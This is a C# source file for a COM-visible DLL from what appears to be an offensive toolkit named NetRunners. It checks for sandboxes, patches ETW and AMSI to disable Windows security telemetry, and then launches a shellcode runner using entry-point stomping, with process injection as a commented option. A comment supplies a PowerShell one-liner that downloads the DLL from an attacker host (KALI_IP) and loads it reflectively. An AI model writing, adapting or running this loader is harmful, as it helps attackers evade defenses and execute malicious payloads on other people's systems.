using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using NetRunners.Heuristics;
using NetRunners.Interfaces;
using NetRunners.Patchers;
using NetRunners.Runners;

[ComVisible(true)]
public class TestClass
{
    /// <summary>
    /// Main function for this DLL. 
    /// Calls Heuristics and Amsi patch, then calls a runner (uncomment one and keep others commented.)
    /// </summary>
    /// <example>
    /// You can run this compiled managed DLL using this powershell one-liner:
    /// [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://KALI_IP/NetRunnersDll.dll')).GetType('NetRunnersDll.TestClass').GetMethod('TestClass').Invoke(0, $null)
    /// </example>

    public TestClass()
    {
        if (!SleepHeuristic.Check() || !NonEmulatedApiHeuristic.Check() || !EtwPatcher.Patch() || !AmsiPatcher.Patch())
        {
            return; // Exit if any checks fail or patching fails
        }

        // uncomment your choice
        //IRunner runner = new ProcessInjectionRunner();
        //IRunner runner = new DefaultRunner();
        IRunner runner = new EntryPointStompingRunner();
        runner.Run();
    }
    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}
